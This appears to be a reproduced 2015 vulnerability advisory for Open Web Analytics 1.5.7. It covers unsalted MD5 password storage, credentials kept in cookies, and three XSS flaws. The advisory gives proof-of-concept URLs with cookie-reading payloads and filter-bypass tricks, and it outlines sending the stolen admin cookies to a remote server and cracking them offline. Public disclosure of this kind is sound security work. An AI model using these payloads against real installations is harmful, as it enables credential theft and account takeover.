@@ -1,0 +1,175 @@
+id: 23918
+date: 07/23/2015
+title: Open Web Analytics 1.5.7 Multiple Vulnerabilities
+author: John Page
+cves: 
+
+[+] Credits: John Page ( hyp3rlinx )
+
+[+] Domains: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-OPENWEBANALYTICS0721.txt
+
+
+
+Vendor:
+================================
+www.openwebanalytics.com
+
+
+
+Product:
+================================
+Open-Web-Analytics-1.5.7
+
+
+Advisory Information:
+=======================================================
+Cryptographic, Password Disclosure & XSS Vulnerabilities
+
+
+
+
+Vulnerability Details:
+=====================
+
+
+Cryptographic Weakness:
+-----------------------
+Passwords are stored in the database using MD5 hash algorithm
+NON salted, we find in owa_lib.php,
+
+public static function encryptPassword($password) {
+ return md5(strtolower($password).strlen($password));
+}
+
+
+Password Disclosure:
+--------------------
+In owa_auth.php on line 329 we find saveCredentials() PHP function which
+saves the
+username & password as browser domain cookie leaving us direct access via
+XSS attack.
+
+function saveCredentials() {
+  $this->e->debug('saving user credentials to cookies');
+  setcookie($this->config['ns'].'u', $this->u->get('user_id'),
+time()+3600*24*365*10, '/', $this->config['cookie_domain']);
+  setcookie($this->config['ns'].'p', $this->u->get('password'),
+time()+3600*24*30, '/', $this->config['cookie_domain']);
+}
+
+
+
+XSS:
+----
+Application is vulnerable to XSS So, now we can access the Admin username &
+password
+credentials from our XSS attack, do a window.open() or whatever and send to
+a remote server
+then come back and login after performing offline crack of the hash. Since
+we cannot seem
+to echo the password using document.cookie we will use
+window.document['cookie'] to gain
+access to admin password. The application uses the admin username and
+password as persistant browser
+cookies which is our dream come true!
+
+e.g. retrieved username & passwd via XSS ( owa_u=admin;
+owa_p=76ffbb8d470d6a402b3c429f35be8a1a )
+user: admin / passwd: abc123
+
+
+Also a second XSS vector exists in Install PHP script via POST request in
+the Email address field.
+
+
+Exploit code(s):
+================
+
+
+XSS(s) POC:
+
+1- Steal username & password XSS, in this example we inject our malicious
+payload into the middle of the site ID hash.
+http://localhost/Open-Web-Analytics-1.5.7/Open-Web-Analytics-1.5.7/index.php?owa_do=base.sitesInvocation&owa_siteId=e9144cf4%22/%3E%22--%3E%3CDIV%20id=%27HELL%27%20onMouseMove=alert%28window.document[%27cookie%27]%29;%3C!--
+
+Injecting <script> tags seems to be problem, we will defeat that by
+injecting our own <DIV id='HELL'> tag and call our
+JS function using the DOMS onMouseOver() event listener we can also use
+onMouseMove() etc...
+Application seems to filter %20 white space, however we can bypass that
+using '\x20' raw hex representation.
+Finally, to make it execute without interference we need to comment out the
+rest of the code within the webpage
+by inject '<!--' begin comments script right after our evil JS.
+
+vuln param:
+owa_siteId
+
+
+2-
+http://localhost/Open-Web-Analytics-1.5.7/Open-Web-Analytics-1.5.7/index.php?owa_site_id=&owa_status_code=25%22/%3E%22--%3E%3CDIV%20id=%27hell%27%20onMouseMove=alert%28window.document[%27cookie%27]%29;%3C!--00&owa_do=base.optionsGeneral&
+
+vuln param:
+owa_status_code
+
+
+2- install.php XSS:
+http://localhost/Open-Web-Analytics-1.5.7/Open-Web-Analytics-1.5.7/install.php?owa_site_id=&owa_do=base.installDefaultsEntry&
+
+Inject " onMouseOver="alert(666); into Email address field and submit form.
+
+
+vuln param:
+owa_email_address
+
+
+Disclosure Timeline:
+=========================================================
+
+
+Vendor Notification: July 17, 2015
+July 22, 2015 : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+] GET / POST
+
+
+Vulnerable Product:             [+] Open-Web-Analytics-1.5.7
+
+
+Vulnerable Parameter(s):        [+] owa_siteId, owa_status_code,
+owa_email_address
+
+
+Affected Area(s):               [+] Admin
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author. The author is not responsible for any misuse of the information
+contained herein and prohibits any malicious use of all security related
+information or exploits by the author or elsewhere.
+
+
+(hyp3rlinx)
+
+#  0day.today [2023-03-22]  #
